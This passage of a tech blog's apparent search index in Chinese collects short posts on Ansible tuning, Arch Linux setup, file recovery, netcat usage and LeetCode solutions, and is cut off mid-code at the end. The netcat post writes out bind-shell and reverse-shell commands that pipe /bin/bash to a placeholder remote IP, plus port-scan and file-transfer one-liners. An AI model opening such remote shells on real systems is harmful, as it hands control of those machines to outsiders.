configuration\n","permalink":"https://littlebees.github.io/2021/10/%E5%9C%A8wsl2%E4%BD%BF%E7%94%A8vagrant/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003evm與container的使用情境不同，還是要懂\n同時這個也比docker或是k8s好懂、好操作多\u003c/p\u003e","title":"在wsl2使用vagrant"},{"content":"動機 不知道為什麼c常出現這種問題，就記錄一下 重點是在c中，所有資料都是數字\n想法 NULL當成數字是0 ptr是數字(addr) ptr++ = ptr + sizeof(type of ptr) code typedef struct { char Name[12]; int Age; float Weight; int RollNumber; } sStudentInfo; int main() { sStudentInfo* ptr = NULL; printf(\u0026#34;size: %d\\n\u0026#34;, (int)(++ptr)); } Ref How to find the size of structure in C without using sizeof? Pointer arithmetic in C programming\n","permalink":"https://littlebees.github.io/2021/10/%E6%B2%92%E6%9C%89sizeof%E7%AE%97size/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e不知道為什麼c常出現這種問題，就記錄一下\n重點是\u003cstrong\u003e在c中，所有資料都是數字\u003c/strong\u003e\u003c/p\u003e","title":"沒有sizeof算size"},{"content":"動機 最近常用，來整理一下\n一次裝很多app 如果要裝就都放在name中\n- name: Install a list of packages yum: name: - nginx - postgresql - postgresql-server state: present 盡量用module 一般來說module可以在有重複時自動跳過，但有的時候module就是有bug，就沒辦法只能用command或是shell\ncommand與shell差在? command: 直接跑在/bin/sh shell: 看對面設定的shell是什麼\nStrategy Strategy就是在執行playbook時怎麼與其他主機協調 一般是linear，會等大家都做完才會跑下一個 free，就是自己跑自己的\n加var到ansible.cfg\n[defaults] strategy = free forks 如果主機很多就要一次多跑一點ansible，就要去調forks，預設只有5\n加var到ansible.cfg\n[defaults] forks=25 Async tasks 一般來說ansible都會等對面的主機把task跑好，但有些task可以同時跑!!\n- name: Execute the long running script shell: \u0026#34;chmod a+x /tmp/longrunningscript.sh \u0026amp;\u0026amp; /tmp/my-longrunning-script.sh 60\u0026#34; # Run for 60 seconds async: 120 # Maximum allowed time in Seconds poll: 05 # Polling Interval in Seconds - name: Some non dependent task I want to run even if the script is still running yum: name: httpd state: present ssh pipeline \u0026amp; Mitogen ssh pipeline ansible提供的減少ssh通訊的方式\n加var到ansible.cfg 或是 ANSIBLE_PIPELINING=True [ssh_connection] pipelining = True 確保對面的/etc/sudoers中沒有requiretty (據說不用了，但文件寫要) Mitogen 強大的IPC框架，ansible不用動，但還是有些要注意的\n載mitogen-0.2.9.tar.gz並unzip 加var到ansible.cfg [defaults] strategy_plugins = /path/to/mitogen-0.2.9/ansible_mitogen/plugins/strategy strategy = mitogen_linear gather fact gather_facts很慢，能不用就不用 - hosts: all gather_facts: no tasks: - ping: 不然就是同一台只跑一次 (cache fact) 加var到ansible.cfg，把cache放到/tmp中\n[defaults] gathering = smart fact_caching = jsonfile fact_caching_connection = /tmp profile 在跑每個task時把花的時間print出來\n加var到ansible.cfg\n[defaults] callback_whitelist = profile_task Ref How to Speed Up Your Ansible Playbooks Over 600% How to speed up Ansible playbooks drastically ?\n","permalink":"https://littlebees.github.io/2021/10/%E5%B9%ABansible%E5%8A%A0%E9%80%9F/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e最近常用，來整理一下\u003c/p\u003e","title":"幫ansible加速!!"},{"content":"動機 這是更新上次安裝arch的流程\n用systemd-boot 用systemd-networkd 用systemd-homed 用doas 優化pacman systemd-boot 取代grub，預設裝在systemd中的bootloader\n詳細流程\n把/boot/創好 裝arch 之後/boot/中要有initrf與vmlinuz bootctl install 放設定檔 /boot/loader/loader.conf\ndefault arch timeout 0 /boot/loader/entries/arch.conf\ntitle Arch Linux linux /vmlinuz-linux initrd /initramfs-linux.img options root=PARTUUID=[UUID] rw UUID用blkid -s PARTUUID -o value [path to arch root device]\nsystemd-networkd 就是管網路的，但不太好用，想預設沒個網卡用dhcp要自己設定\n/etc/systemd/network/10-dhcp.network\n[Match] Name=* [Network] DHCP=Yes systemd-homed 創帳號很痛苦 新的管帳號的方式，但很不方便\n在chroot時不能用systemd，所以沒辦法創帳號 創帳號一定要密碼，但沒辦法用echo去給!! 第一點目前沒想法，所以就等reboot後再創帳號 homectl create {{ user_id }} --group=wheel --shell=/bin/zsh\n第二點在翻了homectl的source code發現有一個env可以放密碼!! \u0026quot;NEWPASSWORD={{ user_pw }} homectl create {{ user_id }} --group=wheel --shell=/bin/zsh\nssh沒有啟動的帳號 arch的wiki有解法\n在創帳號時紀錄sshd要去哪邊看authorized-keys NEWPASSWORD={{ user_pw }} homectl create {{ user_id }} --group=wheel --shell=/bin/zsh --ssh-authorized-keys=@/home/authorized_keys 改sshd_config 之後登入都是用public key與password sshd_config\nAuthenticationMethods publickey,password AuthorizedKeysCommand /usr/bin/userdbctl ssh-authorized-keys %u AuthorizedKeysCommandUser root PasswordAuthentication yes su不給用 另外還有一個是homed沒辦法直接su，這要改su的pam(原本只吃unix的account) /etc/pam.d/su-l\nauth include system-auth account include system-auth session include system-auth password include system-auth doas simple的sudo\ndoas conf /etc/doas.conf\npermit persist :wheel 在wheel group可以用doas，同時在成功auth後一段時間不用打密碼\ndoas auto-complete ~/.bashrc\ncomplete -cf doas 優化pacman reflector怪怪的 當初是用reflector直接掃，但是之後看出來的結果沒有最好的site，所以就直接用自己的吧\n另外，在安裝環境改的mirrorlist會直接影響到被安裝的mirrorlist。 也就是只要copy一次，在chroot中不用再複製一次\nServer = http://free.nchc.org.tw/arch/$repo/os/$arch Server = http://archlinux.cs.nctu.edu.tw/$repo/os/$arch Server = http://shadow.ind.ntou.edu.tw/archlinux/$repo/os/$arch pacman平行化 pacman一次只載一個，所以要改一下設定 /etc/pacman.conf\n... ParallelDownloads = 10 ... ","permalink":"https://littlebees.github.io/2021/10/arch-linux%E7%9A%84%E5%AE%89%E8%A3%9D%E6%9B%B4%E6%96%B0/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這是更新上次安裝arch的流程\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e用systemd-boot\u003c/li\u003e\n\u003cli\u003e用systemd-networkd\u003c/li\u003e\n\u003cli\u003e用systemd-homed\u003c/li\u003e\n\u003cli\u003e用doas\u003c/li\u003e\n\u003cli\u003e優化pacman\u003c/li\u003e\n\u003c/ol\u003e","title":"arch linux的安裝更新"},{"content":"動機 紀錄一下\nSol 還有程式open著 lsof | grep [file path] progname PID user FD REG 8,1 16791251 265368 [file path] cp /proc/PID/fd/FD [recover path] 沒有 用最快的速度umount或remount成read-only mount -o remount,ro /dev/[partition] umount /dev/[partition] 根據filesystem用對應的工具去救(ext4) extundelete /dev/\u0026lt;device-file\u0026gt; --restore-all ","permalink":"https://littlebees.github.io/2021/10/%E6%8B%AF%E6%95%91rm%E7%9A%84%E6%AA%94%E6%A1%88/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e紀錄一下\u003c/p\u003e","title":"拯救rm的檔案"},{"content":"動機 netcat就是simple的tcp/udp socket 重點是很方便，一行就可以把client與server建好!!\n基本用法 server nc -l -p [port] -l: listen -p: 當成listen的port client nc -vv -n -w 1 [remote ip] [port] -p [source port] -n: 不要用dns，如果打的是ip，一定要用這個!! -w 1: 1秒後沒有任何輸入就停止 gnu-netcat，不知道為什麼就是不會停? openbsd-netcat就會停 -p: source port -vv: very verbose!! 連線建好後 就可以一直傳資料 -z: 不傳任何資料!! 就是port scan nc -zv [ip] [port1]-[port2] [port3]-[port4] 上面就是輸出輸入都是到stdin與stdout -e: 可以把stdin與stdout導到程式 讓程式處理input與output 預設是tcp -u: udp 用法 shell nc -l -p [port] -e /bin/bash 讓bash去回應request nc -l [remote ip] [port] client可以輸入指令，來用server的bash reverse shell nc -l -p [port] server可以輸入(指令，來用client的bash) nc -l [remote ip] [port] -e /bin/bash 讓bash去回應request 傳檔案 nc -l -p [port] \u0026gt; outfile cat thefile | nc -v -n -w 1 [remote ip] [port] 因為是透過stdin與stdout，所以可以與其他指令結合 dd tar 小server while true; do nc -l -p [port] \u0026lt; index.html; done Ref Netcat Cheat Sheet Netcat（Linux nc 指令）網路管理者工具實用範例\n","permalink":"https://littlebees.github.io/2021/10/netcat%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003enetcat就是simple的tcp/udp socket\n重點是很方便，一行就可以把client與server建好!!\u003c/p\u003e","title":"netcat的基本用法"},{"content":"動機 複習subset的backtrack\nProblem The XOR total of an array is defined as the bitwise XOR of all its elements, or 0 if the array is empty.\nFor example, the XOR total of the array [2,5,6] is 2 XOR 5 XOR 6 = 1.Given an array nums, return the sum of all XOR totals for every subset of nums. Note: Subsets with the same elements should be counted multiple times.\nAn array a is a subset of an array b if a can be obtained from b by deleting some (possibly zero) elements of b.\nExample 1:\nInput: nums = [1,3]Output: 6Explanation: The 4 subsets of [1,3] are:- The empty subset has an XOR total of 0.- [1] has an XOR total of 1.- [3] has an XOR total of 3.- [1,3] has an XOR total of 1 XOR 3 = 2.0 + 1 + 3 + 2 = 6Example 2:\nInput: nums = [5,1,6]Output: 28Explanation: The 8 subsets of [5,1,6] are:- The empty subset has an XOR total of 0.- [5] has an XOR total of 5.- [1] has an XOR total of 1.- [6] has an XOR total of 6.- [5,1] has an XOR total of 5 XOR 1 = 4.- [5,6] has an XOR total of 5 XOR 6 = 3.- [1,6] has an XOR total of 1 XOR 6 = 7.- [5,1,6] has an XOR total of 5 XOR 1 XOR 6 = 2.0 + 5 + 1 + 6 + 4 + 3 + 7 + 2 = 28Example 3:\nInput: nums = [3,4,5,6,7,8]Output: 480Explanation: The sum of all XOR totals for every subset is 480. Constraints:\n1 \u003c= nums.length \u003c= 121 \u003c= nums[i] \u003c= 20 Sol class Solution: def subsetXORSum(self, nums: List[int], acc=0) -\u0026gt; int: if not nums: return acc else: return self.subsetXORSum(nums[1:],acc)+self.subsetXORSum(nums[1:],acc^nums[0]) ","permalink":"https://littlebees.github.io/2021/09/leetcode-1863-sum-of-all-subset-xor-totals/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習subset的backtrack\u003c/p\u003e","title":"leetcode-1863 - Sum of All Subset XOR Totals"},{"content":"動機 硬幹，或是好像看得懂的case study?\nProblem Design the CombinationIterator class:\nCombinationIterator(string characters, int combinationLength) Initializes the object with a string characters of sorted distinct lowercase English letters and a number combinationLength as arguments.next() Returns the next combination of length combinationLength in lexicographical order.hasNext() Returns true if and only if there exists a next combination. Example 1:\nInput[\"CombinationIterator\", \"next\", \"hasNext\", \"next\", \"hasNext\", \"next\", \"hasNext\"][[\"abc\", 2], [], [], [], [], [], []]Output[Algorithm, Leetcode, \"ab\", true, \"ac\", true, \"bc\", false]ExplanationCombinationIterator itr = new CombinationIterator(\"abc\", 2);itr.next(); // return \"ab\"itr.hasNext(); // return Trueitr.next(); // return \"ac\"itr.hasNext(); // return Trueitr.next(); // return \"bc\"itr.hasNext(); // return False Constraints:\n1 \u003c= combinationLength \u003c= characters.length \u003c= 15All the characters of characters are unique.At most 104 calls will be made to next and hasNext.It's guaranteed that all calls of the function next are valid. Sol def f(cs, n, acc=[], start=0): if len(acc) == n: return [\u0026#39;\u0026#39;.join(acc)] elif not cs: return [] else: ret = [] for i in range(start,len(cs)): ret += f(cs,n,acc+[cs[i]],i+1) return ret class CombinationIterator: def __init__(self, characters: str, combinationLength: int): self.combs = f(list(characters), combinationLength) self.i = 0 def next(self) -\u0026gt; str: self.i += 1 return self.combs[self.i-1] def hasNext(self) -\u0026gt; bool: return self.i \u0026lt; len(self.combs) case study source\nfrom os.path import commonprefix class CombinationIterator: def __init__(self, characters, combinationLength): self.c = characters self.len = combinationLength self.state = \u0026#34;\u0026#34; def next(self): if self.state == \u0026#34;\u0026#34;: self.state = self.c[:self.len] else: end = len(commonprefix([self.c[::-1], self.state[::-1]])) place = self.c.index(self.state[-end-1]) self.state = self.state[:-end-1] + self.c[place + 1: place + 2 + end] return self.state def hasNext(self): return self.state != self.c[-self.len:] ","permalink":"https://littlebees.github.io/2021/09/leetcode-1286-iterator-for-combination/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e硬幹，或是好像看得懂的case study?\u003c/p\u003e","title":"leetcode-1286 - Iterator for Combination"},{"content":"動機 高中排列組合\nProblem Given an integer n, return the count of all numbers with unique digits, x, where 0 \u003c= x \u003c 10n.\nExample 1:\nInput: n = 2Output: 91Explanation: The answer should be the total numbers in the range of 0 ≤ x \u003c 100, excluding 11,22,33,44,55,66,77,88,99Example 2:\nInput: n = 0Output: 1 Constraints:\n0 \u003c= n \u003c= 8 Sol class Solution: def countNumbersWithUniqueDigits(self, n: int) -\u0026gt; int: if n == 0: return 1 else: return sum(9*perm(9,x-1) for x in range(1,n+1))+1 ","permalink":"https://littlebees.github.io/2021/09/leetcode-357-count-numbers-with-unique-digits/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e高中排列組合\u003c/p\u003e","title":"leetcode-357 - Count Numbers with Unique Digits"},{"content":"動機 就硬幹\nProblem Given an array target and an integer n. In each iteration, you will read a number from list = {1,2,3..., n}.\nBuild the target array using the following operations:\nPush: Read a new element from the beginning list, and push it in the array.Pop: delete the last element of the array.If the target array is already built, stop reading more elements.Return the operations to build the target array. You are guaranteed that the answer is unique.\nExample 1:\nInput: target = [1,3], n = 3Output: [\"Push\",\"Push\",\"Pop\",\"Push\"]Explanation: Read number 1 and automatically push in the array -\u003e [1]Read number 2 and automatically push in the array then Pop it -\u003e [1]Read number 3 and automatically push in the array -\u003e [1,3]Example 2:\nInput: target = [1,2,3], n = 3Output: [\"Push\",\"Push\",\"Push\"]Example 3:\nInput: target = [1,2], n = 4Output: [\"Push\",\"Push\"]Explanation: You only need to read the first 2 numbers and stop.Example 4:\nInput: target = [2,3,4], n = 4Output: [\"Push\",\"Pop\",\"Push\",\"Push\",\"Push\"] Constraints:\n1 \u003c= target.length \u003c= 1001 \u003c= target[i] \u003c= n1 \u003c= n \u003c= 100target is strictly increasing. Sol class Solution: def buildArray(self, target: List[int], n: int) -\u0026gt; List[str]: i = 0 ret = [] for x in range(1,n+1): if i == len(target): return ret else: ret += \u0026#34;Push\u0026#34;, if target[i] != x: ret += \u0026#34;Pop\u0026#34;, else: i += 1 return ret ","permalink":"https://littlebees.github.io/2021/09/leetcode-1441-build-an-array-with-stack-operations/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就硬幹\u003c/p\u003e","title":"leetcode-1441 - Build an Array With Stack Operations"},{"content":"動機 就硬幹\nProblem You are playing the Bulls and Cows game with your friend.\nYou write down a secret number and ask your friend to guess what the number is. When your friend makes a guess, you provide a hint with the following info:\nThe number of \"bulls\", which are digits in the guess that are in the correct position.The number of \"cows\", which are digits in the guess that are in your secret number but are located in the wrong position. Specifically, the non-bull digits in the guess that could be rearranged such that they become bulls.Given the secret number secret and your friend's guess guess, return the hint for your friend's guess.\nThe hint should be formatted as \"xAyB\", where x is the number of bulls and y is the number of cows. Note that both secret and guess may contain duplicate digits.\nExample 1:\nInput: secret = \"1807\", guess = \"7810\"Output: \"1A3B\"Explanation: Bulls are connected with a '|' and cows are underlined:\"1807\" |\"7810\"Example 2:\nInput: secret = \"1123\", guess = \"0111\"Output: \"1A1B\"Explanation: Bulls are connected with a '|' and cows are underlined:\"1123\" \"1123\" | or |\"0111\" \"0111\"Note that only one of the two unmatched 1s is counted as a cow since the non-bull digits can only be rearranged to allow one 1 to be a bull.Example 3:\nInput: secret = \"1\", guess = \"0\"Output: \"0A0B\"Example 4:\nInput: secret = \"1\", guess = \"1\"Output: \"1A0B\" Constraints:\n1 \u003c= secret.length, guess.length \u003c= 1000secret.length == guess.lengthsecret and guess consist of digits only. Sol class Solution: def getHint(self, secret: str, guess: str) -\u0026gt; str: bulls = sum(a == b for a,b in zip(secret, guess)) strs = [(a,b) for a,b in zip(secret, guess) if a != b] a, b = Counter(a for a,b in strs), Counter(b for a,b in strs) cows = sum(min(a[x],b[x]) for x in a.keys() if x in b) return f\u0026#39;{bulls}A{cows}B\u0026#39; ","permalink":"https://littlebees.github.io/2021/09/leetcode-299-bulls-and-cows/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就硬幹\u003c/p\u003e","title":"leetcode-299 - Bulls and Cows"},{"content":"動機 bsearch的用法\n猜數字 找位置 Problem Winter is coming! During the contest, your first job is to design a standard heater with a fixed warm radius to warm all the houses.\nEvery house can be warmed, as long as the house is within the heater's warm radius range. Given the positions of houses and heaters on a horizontal line, return the minimum radius standard of heaters so that those heaters could cover all houses.\nNotice that all the heaters follow your radius standard, and the warm radius will the same.\nExample 1:\nInput: houses = [1,2,3], heaters = [2]Output: 1Explanation: The only heater was placed in the position 2, and if we use the radius 1 standard, then all the houses can be warmed.Example 2:\nInput: houses = [1,2,3,4], heaters = [1,4]Output: 1Explanation: The two heater was placed in the position 1 and 4. We need to use radius 1 standard, then all the houses can be warmed.Example 3:\nInput: houses = [1,5], heaters = [2]Output: 3 Constraints:\n1 \u003c= houses.length, heaters.length \u003c= 3 * 1041 \u003c= houses[i], heaters[i] \u003c= 109 Sol 猜數字\nclass Solution: def findRadius(self, houses: List[int], heaters: List[int]) -\u0026gt; int: houses.sort() heaters.sort() def count(r): i = 0 for h in heaters: if i == len(houses): break elif abs(h-houses[i]) \u0026lt;= r: while i \u0026lt; len(houses) and abs(h-houses[i]) \u0026lt;= r: i += 1 return i == len(houses) a,b = 0, max(heaters[-1]-houses[0], houses[-1]-houses[0]) while a\u0026lt;b: mid = (a+b)//2 if count(mid): #print(mid, True, a, mid) b = mid else: #print(mid, False, mid+1, b) a = mid+1 return a 找位置\nclass Solution: def findRadius(self, houses: List[int], heaters: List[int]) -\u0026gt; int: heaters.sort() get = lambda l,i: l[i] if 0 \u0026lt;= i \u0026lt; len(l) else float(\u0026#39;inf\u0026#39;) ret = 0 for h in houses: x = bisect_right(heaters, h) ret = max(ret, min(abs(get(heaters, x)-h), abs(get(heaters, x-1)-h))) return ret ","permalink":"https://littlebees.github.io/2021/09/leetcode-475-heaters/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003ebsearch的用法\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e猜數字\u003c/li\u003e\n\u003cli\u003e找位置\u003c/li\u003e\n\u003c/ul\u003e","title":"leetcode-475 - Heaters"},{"content":"動機 最小路徑? no,no 最短路徑!!!\nProblem You are a hiker preparing for an upcoming hike. You are given heights, a 2D array of size rows x columns, where heights[row][col] represents the height of cell (row, col). You are situated in the top-left cell, (0, 0), and you hope to travel to the bottom-right cell, (rows-1, columns-1) (i.e., 0-indexed). You can move up, down, left, or right, and you wish to find a route that requires the minimum effort.\nA route's effort is the maximum absolute difference in heights between two consecutive cells of the route.\nReturn the minimum effort required to travel from the top-left cell to the bottom-right cell.\nExample 1:\nInput: heights = [[1,2,2],[3,8,2],[5,3,5]]Output: 2Explanation: The route of [1,3,5,3,5] has a maximum absolute difference of 2 in consecutive cells.This is better than the route of [1,2,2,2,5], where the maximum absolute difference is 3.Example 2:\nInput: heights = [[1,2,3],[3,8,4],[5,3,5]]Output: 1Explanation: The route of [1,2,3,4,5] has a maximum absolute difference of 1 in consecutive cells, which is better than route [1,3,5,3,5].Example 3:\nInput: heights = [[1,2,1,1,1],[1,2,1,2,1],[1,2,1,2,1],[1,2,1,2,1],[1,1,1,2,1]]Output: 0Explanation: This route does not require any effort. Constraints:\nrows == heights.lengthcolumns == heights[i].length1 \u003c= rows, columns \u003c= 1001 \u003c= heights[i][j] \u003c= 106 Sol from sortedcontainers import SortedList class Solution: def minimumEffortPath(self, hs: List[List[int]]) -\u0026gt; int: legal = lambda i,j: 0 \u0026lt;= i \u0026lt; len(hs) and 0 \u0026lt;= j \u0026lt; len(hs[0]) hq = [(0,(0,0))] efferts = defaultdict(lambda : float(\u0026#39;inf\u0026#39;)) while hq: cur, (x,y) = heappop(hq) if x == len(hs)-1 and y == len(hs[x])-1: return cur else: dirs = [(x+1,y),(x,y+1),(x-1,y),(x,y-1)] dirs = [(a,b) for a,b in dirs if legal(a,b)] for a,b in dirs: now = max(cur,abs(hs[a][b]-hs[x][y])) if now \u0026lt; efferts[(a,b)]: efferts[(a,b)] = now heappush(hq, (efferts[(a,b)], (a,b))) return -1 ","permalink":"https://littlebees.github.io/2021/09/leetcode-1631-path-with-minimum-effort/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e最小路徑? no,no\n最短路徑!!!\u003c/p\u003e","title":"leetcode-1631 - Path With Minimum Effort"},{"content":"動機 複習組合數\nProblem Given an array of integers nums, return the number of good pairs.\nA pair (i, j) is called good if nums[i] == nums[j] and i \u003c j.\nExample 1:\nInput: nums = [1,2,3,1,1,3]Output: 4Explanation: There are 4 good pairs (0,3), (0,4), (3,4), (2,5) 0-indexed.Example 2:\nInput: nums = [1,1,1,1]Output: 6Explanation: Each pair in the array are good.Example 3:\nInput: nums = [1,2,3]Output: 0 Constraints:\n1 \u003c= nums.length \u003c= 1001 \u003c= nums[i] \u003c= 100 Sol class Solution: def numIdenticalPairs(self, nums: List[int]) -\u0026gt; int: return sum([comb(x,2) for x in Counter(nums).values() if x \u0026gt; 1],0) ","permalink":"https://littlebees.github.io/2021/09/leetcode-1512-number-of-good-pairs/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習組合數\u003c/p\u003e","title":"leetcode-1512 - Number of Good Pairs"},{"content":"動機 這個真的想不到!!\n用dp紀錄狀態 從dp(swap)找出另一個dp(fix) Problem You are given two integer arrays of the same length nums1 and nums2. In one operation, you are allowed to swap nums1[i] with nums2[i].\nFor example, if nums1 = [1,2,3,8], and nums2 = [5,6,7,4], you can swap the element at i = 3 to obtain nums1 = [1,2,3,4] and nums2 = [5,6,7,8].Return the minimum number of needed operations to make nums1 and nums2 strictly increasing. The test cases are generated so that the given input always makes it possible.\nAn array arr is strictly increasing if and only if arr[0] \u003c arr[1] \u003c arr[2] \u003c ... \u003c arr[arr.length - 1].\nExample 1:\nInput: nums1 = [1,3,5,4], nums2 = [1,2,3,7]Output: 1Explanation: Swap nums1[3] and nums2[3]. Then the sequences are:nums1 = [1, 3, 5, 7] and nums2 = [1, 2, 3, 4]which are both strictly increasing.Example 2:\nInput: nums1 = [0,3,5,8,9], nums2 = [2,1,4,6,9]Output: 1 Constraints:\n2 \u003c= nums1.length \u003c= 105nums2.length == nums1.length0 \u003c= nums1[i], nums2[i] \u003c= 2 * 105 Sol fix是這一點沒有被swap的情況下成為increasing需要幾次swap swap是這一點被swap後的情況下成為increasing需要幾次swap\nclass Solution: def minSwap(self, nums1: List[int], nums2: List[int]) -\u0026gt; int: fix = 0 swap = 1 for i in range(1,len(nums1)): fixa = fixb = swapa = swapb = len(nums1) if nums1[i-1] \u0026lt; nums1[i] and nums2[i-1] \u0026lt; nums2[i]: fixa = fix swapa = swap+1 if nums1[i-1] \u0026lt; nums2[i] and nums2[i-1] \u0026lt; nums1[i]: fixb = swap swapb = fix+1 fix, swap = min(fixa,fixb), min(swapa,swapb) return min(fix,swap) ","permalink":"https://littlebees.github.io/2021/09/leetcode-801-minimum-swaps-to-make-sequences-increasing/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這個真的想不到!!\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e用dp紀錄狀態\u003c/li\u003e\n\u003cli\u003e從dp(swap)找出另一個dp(fix)\u003c/li\u003e\n\u003c/ul\u003e","title":"leetcode-801 - Minimum Swaps To Make Sequences Increasing"},{"content":"動機 只要有某個範圍是連續遞增就可以用bsearch!! 寫bsearch就是考慮那邊要丟掉就設成a = mid+1 Problem Given an integer array bloomDay, an integer m and an integer k.\nWe need to make m bouquets. To make a bouquet, you need to use k adjacent flowers from the garden.\nThe garden consists of n flowers, the ith flower will bloom in the bloomDay[i] and then can be used in exactly one bouquet.\nReturn the minimum number of days you need to wait to be able to make m bouquets from the garden. If it is impossible to make m bouquets return -1.\nExample 1:\nInput: bloomDay = [1,10,3,10,2], m = 3, k = 1Output: 3Explanation: Let's see what happened in the first three days. x means flower bloomed and _ means flower didn't bloom in the garden.We need 3 bouquets each should contain 1 flower.After day 1: [x, _, _, _, _] // we can only make one bouquet.After day 2: [x, _, _, _, x] // we can only make two bouquets.After day 3: [x, _, x, _, x] // we can make 3 bouquets. The answer is 3.Example 2:\nInput: bloomDay = [1,10,3,10,2], m = 3, k = 2Output: -1Explanation: We need 3 bouquets each has 2 flowers, that means we need 6 flowers. We only have 5 flowers so it is impossible to get the needed bouquets and we return -1.Example 3:\nInput: bloomDay = [7,7,7,7,12,7,7], m = 2, k = 3Output: 12Explanation: We need 2 bouquets each should have 3 flowers.Here's the garden after the 7 and 12 days:After day 7: [x, x, x, x, _, x, x]We can make one bouquet of the first three flowers that bloomed. We cannot make another bouquet from the last three flowers that bloomed because they are not adjacent.After day 12: [x, x, x, x, x, x, x]It is obvious that we can make two bouquets in different ways.Example 4:\nInput: bloomDay = [1000000000,1000000000], m = 1, k = 1Output: 1000000000Explanation: You need to wait 1000000000 days to have a flower ready for a bouquet.Example 5:\nInput: bloomDay = [1,10,2,9,3,8,4,7,5,6], m = 4, k = 2Output: 9 Constraints:\nbloomDay.length == n1 \u003c= n \u003c= 10^51 \u003c= bloomDay[i] \u003c= 10^91 \u003c= m \u003c= 10^61 \u003c= k \u003c= n Sol class Solution: def minDays(self, bloomDay: List[int], m: int, k: int) -\u0026gt; int: if m*k \u0026gt; len(bloomDay): return -1 def count(day): ret = 0 i = 0 while i \u0026lt; len(bloomDay): if bloomDay[i] \u0026lt;= day: j = i+1 while j \u0026lt; len(bloomDay) and bloomDay[j] \u0026lt;= day: j += 1 ret += (j-i)//k i = j else: i += 1 return ret a,b = min(bloomDay), max(bloomDay) while a\u0026lt;b: mid = (a+b)//2 #print(a,mid,b,count(mid)) if count(mid) \u0026lt; m: a = mid+1 else: b = mid return a ","permalink":"https://littlebees.github.io/2021/09/leetcode-1482-minimum-number-of-days-to-make-m-bouquets/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e只要有某個範圍是連續遞增就可以用bsearch!!\u003c/li\u003e\n\u003cli\u003e寫bsearch就是考慮那邊要丟掉就設成\u003ccode\u003ea = mid+1\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e","title":"leetcode-1482 - Minimum Number of Days to Make m Bouquets"},{"content":"動機 lee215，不用質疑的神\n用Monotonic Stack+sort求最小(大)的最近的index!! Problem You are given an integer array arr. From some starting index, you can make a series of jumps. The (1st, 3rd, 5th, ...) jumps in the series are called odd-numbered jumps, and the (2nd, 4th, 6th, ...) jumps in the series are called even-numbered jumps. Note that the jumps are numbered, not the indices.\nYou may jump forward from index i to index j (with i \u003c j) in the following way:\nDuring odd-numbered jumps (i.e., jumps 1, 3, 5, ...), you jump to the index j such that arr[i] \u003c= arr[j] and arr[j] is the smallest possible value. If there are multiple such indices j, you can only jump to the smallest such index j.During even-numbered jumps (i.e., jumps 2, 4, 6, ...), you jump to the index j such that arr[i] \u003e= arr[j] and arr[j] is the largest possible value. If there are multiple such indices j, you can only jump to the smallest such index j.It may be the case that for some index i, there are no legal jumps.A starting index is good if, starting from that index, you can reach the end of the array (index arr.length - 1) by jumping some number of times (possibly 0 or more than once).\nReturn the number of good starting indices.\nExample 1:\nInput: arr = [10,13,12,14,15]Output: 2Explanation: From starting index i = 0, we can make our 1st jump to i = 2 (since arr[2] is the smallest among arr[1], arr[2], arr[3], arr[4] that is greater or equal to arr[0]), then we cannot jump any more.From starting index i = 1 and i = 2, we can make our 1st jump to i = 3, then we cannot jump any more.From starting index i = 3, we can make our 1st jump to i = 4, so we have reached the end.From starting index i = 4, we have reached the end already.In total, there are 2 different starting indices i = 3 and i = 4, where we can reach the end with some number ofjumps.Example 2:\nInput: arr = [2,3,1,1,4]Output: 3Explanation: From starting index i = 0, we make jumps to i = 1, i = 2, i = 3:During our 1st jump (odd-numbered), we first jump to i = 1 because arr[1] is the smallest value in [arr[1], arr[2], arr[3], arr[4]] that is greater than or equal to arr[0].During our 2nd jump (even-numbered), we jump from i = 1 to i = 2 because arr[2] is the largest value in [arr[2], arr[3], arr[4]] that is less than or equal to arr[1]. arr[3] is also the largest value, but 2 is a smaller index, so we can only jump to i = 2 and not i = 3During our 3rd jump (odd-numbered), we jump from i = 2 to i = 3 because arr[3] is the smallest value in [arr[3], arr[4]] that is greater than or equal to arr[2].We can't jump from i = 3 to i = 4, so the starting index i = 0 is not good.In a similar manner, we can deduce that:From starting index i = 1, we jump to i = 4, so we reach the end.From starting index i = 2, we jump to i = 3, and then we can't jump anymore.From starting index i = 3, we jump to i = 4, so we reach the end.From starting index i = 4, we are already at the end.In total, there are 3 different starting indices i = 1, i = 3, and i = 4, where we can reach the end with somenumber of jumps.Example 3:\nInput: arr = [5,1,3,4,2]Output: 3Explanation: We can reach the end from starting indices 1, 2, and 4. Constraints:\n1 \u003c= arr.length \u003c= 2 * 1040 \u003c= arr[i] \u003c 105 Sol 這題頭痛的是怎麼求出下一個jump點，不然dp起來很簡單\n這裡要最大中的最近、最小中的最近\n最小中的最近，可以sort，這樣就有最小，接著是最近，就是mono stack!!\nclass Solution: def oddEvenJumps(self, arr: List[int]) 